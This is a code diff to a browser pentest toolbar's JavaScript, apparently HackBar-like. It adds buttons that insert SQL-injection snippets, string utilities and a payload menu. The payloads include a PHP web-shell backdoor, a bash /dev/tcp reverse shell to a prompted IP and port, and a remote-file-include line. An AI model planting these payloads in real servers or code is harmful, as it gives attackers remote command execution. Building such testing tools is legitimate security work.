@@ -100,9 +100,31 @@ var mssqlcharBtn = document.getElementsByName("mssqlchar")[0];
 var oraclecharBtn = document.getElementsByName("oraclechar")[0];
 var unionselectstmntBtn = document.getElementsByName("unionselectstmnt")[0];
 var spaces2commentsBtn = document.getElementsByName("spaces2comments")[0];
+var mysqlbasicBtn = document.getElementsByName("mysqlbasic")[0];
+var convertutf8Btn = document.getElementsByName("convertutf8")[0];
+var convertlatin1Btn = document.getElementsByName("convertlatin1")[0];
 
+// Strings
+var lowercaseBtn = document.getElementsByName("lowercase")[0];
+var uppercaseBtn = document.getElementsByName("uppercase")[0];
+var randomcaseBtn = document.getElementsByName("randomcase")[0];
+var smallpiBtn = document.getElementsByName("smallpi")[0];
+var bigpiBtn = document.getElementsByName("bigpi")[0];
+var phiBtn = document.getElementsByName("phi")[0];
+var lorumipsumBtn = document.getElementsByName("lorumipsum")[0];
+var fibonacciBtn = document.getElementsByName("fibonacci")[0];
+var bufferoverflowBtn = document.getElementsByName("bufferoverflow")[0];
+
+// Payloads
+var phpbackdoorBtn = document.getElementsByName("phpbackdoor")[0];
+var phprevshellBtn = document.getElementsByName("phprevshell")[0];
+var phprfiBtn = document.getElementsByName("phprfi")[0];
+
+// Comboboxes
 var postdataCbx = document.getElementsByName("enablepostdata")[0];
 var refererCbx = document.getElementsByName("enablereferer")[0];
+
+// Focus Field
 var currentFocusField = null;
 
 /*  add event listeners to buttons */
@@ -146,6 +168,21 @@ spaces2commentsBtn.addEventListener('click', anonClickMenuFunct, false);
 extractcommentsBtn.addEventListener('click', anonClickMenuFunct, false);
 extractregexpBtn.addEventListener('click', anonClickMenuFunct, false);
 stripcustomBtn.addEventListener('click', anonClickMenuFunct, false);
+mysqlbasicBtn.addEventListener('click', anonClickMenuFunct, false);
+convertlatin1Btn.addEventListener('click', anonClickMenuFunct, false);
+convertutf8Btn.addEventListener('click', anonClickMenuFunct, false);
+smallpiBtn.addEventListener('click', anonClickMenuFunct, false);
+bigpiBtn.addEventListener('click', anonClickMenuFunct, false);
+phiBtn.addEventListener('click', anonClickMenuFunct, false);
+lorumipsumBtn.addEventListener('click', anonClickMenuFunct, false);
+fibonacciBtn.addEventListener('click', anonClickMenuFunct, false);
+bufferoverflowBtn.addEventListener('click', anonClickMenuFunct, false);
+phpbackdoorBtn.addEventListener('click', anonClickMenuFunct, false);
+phprevshellBtn.addEventListener('click', anonClickMenuFunct, false);
+phprfiBtn.addEventListener('click', anonClickMenuFunct, false);
+lowercaseBtn.addEventListener('click', anonClickMenuFunct, false);
+uppercaseBtn.addEventListener('click', anonClickMenuFunct, false);
+randomcaseBtn.addEventListener('click', anonClickMenuFunct, false);
 
 postdataCbx.addEventListener('change', togglepostdata);
 refererCbx.addEventListener('change', togglereferer);
@@ -239,9 +276,10 @@ function onClickMenu(event) {
       break;
     case 'stripslashes':
       var txt = this.getSelectedText();
-      var re = new RegExp("/", 'g');
-      var newString = txt.replace(re, '');
-      this.setSelectedText( newString );      
+      txt = txt.replace(/\\'/g,'\'');
+      txt = txt.replace(/\\"/g,'"');
+      txt = txt.replace(/\\\\/g,'\\');
+      this.setSelectedText( txt );  
       break;
     case 'stripspaces':
       var txt = this.getSelectedText();
@@ -380,6 +418,66 @@ function onClickMenu(event) {
     var re = new RegExp(str, 'g');
     var newString = txt.replace(re, '');
     this.setSelectedText( newString ); 
+    break;
+  case "mysqlbasic":
+    this.setSelectedText( "CONCAT_WS(CHAR(32,58,32),user(),database(),version())" );
+    break;
+  case "convertutf8":
+    this.setSelectedText( "CONVERT("+txt+" USING utf8)")
+    break;
+  case "convertlatin1":
+    this.setSelectedText( "CONVERT("+txt+" USING latin1)" )
+    break;
+  case "smallpi":
+    this.setSelectedText( "3,14159265" )
+    break;
+  case "bigpi":
+    this.setSelectedText( "3,14159265358979323846264338327950288419716939937510" )
+    break;
+  case "phi":
+    this.setSelectedText( "1.618033988749895" )
+    break;
+  case "lorumipsum":
+    this.setSelectedText( "Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum." )
+    break;
+  case "fibonacci":
+    this.setSelectedText( "0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946" )
+    break;
+  case "bufferoverflow":
+    var bufferSize = prompt("Buffer Size?")
+    this.setSelectedText( "A".repeat(bufferSize) )
+    break;
+  case "phpbackdoor":
+    this.setSelectedText( "<?php echo system($_GET[\"cmd\"]); ?>" )
+    break;
+  case "phprevshell":
+    var ip = prompt("IP Address?");
+    var port = prompt("Port?");
+    this.setSelectedText( "<?php system(\"bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"); ?>" )
+    break;
+  case "phprfi":
+    this.setSelectedText( "<?php include($_GET[\"file\"]); ?>" )
+    break;
+  case "lowercase":
+    var txt = this.getSelectedText();
+    this.setSelectedText( txt.toLowerCase() )    
+    break;
+  case "uppercase":
+    var txt = this.getSelectedText();
+    this.setSelectedText( txt.toUpperCase() )
+    break;
+  case "randomcase":
+    var txt = this.getSelectedText();
+    var newString = ""
+    for(i = 0;i<txt.length;i++){
+      var rand = Math.random()*10;
+      if(rand > 5){
+        newString += txt.charAt(i).toUpperCase();
+      } else {
+        newString += txt.charAt(i).toLowerCase();
+      }
+    }
+    this.setSelectedText( newString )
     break;
   }
 
